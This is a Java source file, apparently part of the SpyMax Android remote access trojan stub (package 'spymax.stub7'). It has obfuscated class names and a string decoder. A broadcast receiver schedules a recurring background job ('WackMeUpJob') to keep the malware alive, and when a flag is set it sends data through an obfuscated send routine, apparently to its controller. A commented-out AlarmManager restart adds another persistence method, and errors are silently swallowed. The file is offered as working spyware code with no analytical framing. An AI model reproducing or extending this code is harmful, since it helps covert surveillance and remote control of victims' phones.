package spymax.stub7;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

import static spymax.stub7.ClassGen3._Reblace_;

public class ClassGen14 extends BroadcastReceiver {
    public static void ClassGen14scheduleJob(Context context) {
        try
        {
            JobScheduler jobScheduler = (JobScheduler)context.getSystemService(Context.JOB_SCHEDULER_SERVICE);
            ComponentName serviceName = new ComponentName(context, WackMeUpJob.class);
            JobInfo jobInfo;
            if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.N){

                jobInfo = new JobInfo.Builder(100, serviceName)
                        .setPeriodic(900000)
                        .build();
            }else{
                jobInfo = new JobInfo.Builder(100, serviceName)
                        .setPeriodic(15000)
                        .build();
            }

            jobScheduler.schedule(jobInfo);
        }catch (Exception e){}
    }
//    private void ClassGen14restartApp(Context mContext) {
//        try {
//            long restartTime = 1000*5;
//            Intent intents = mContext.getPackageManager().getLaunchIntentForPackage(mContext.getPackageName());
//            PendingIntent restartIntent = PendingIntent.getActivity(mContext, 0, intents, PendingIntent.FLAG_ONE_SHOT);
//            AlarmManager mgr = (AlarmManager) mContext.getSystemService(Context.ALARM_SERVICE);
//
//            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
//                mgr.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + restartTime, restartIntent);
//
//            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
//                mgr.setExact(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + restartTime, restartIntent);
//            }
//        } catch (Exception e) {
//            //  Log.e(TAG, e.getMessage());
//        }
//    }
    @Override
    public void onReceive(Context context, Intent i) {
//        if (ClassGen11.app_ClassGen11_Context== null)
//        {
//            ClassGen11.app_ClassGen11_Context = context;
//        }
        if(ClassGen2.ec_ClassGen2_ho){
            ClassGen2._send_it_( _Reblace_("-25ᴵיˎᵔᵢﹶᴵʻ5","ᴵיˎᵔᵢﹶᴵʻ"),String.valueOf(ClassGen3.FivePlusFive).getBytes());
        }
        try {
           // ClassGen14restartApp(context);
            ClassGen14scheduleJob(context);

        } catch (Exception one) {
        }



    }
}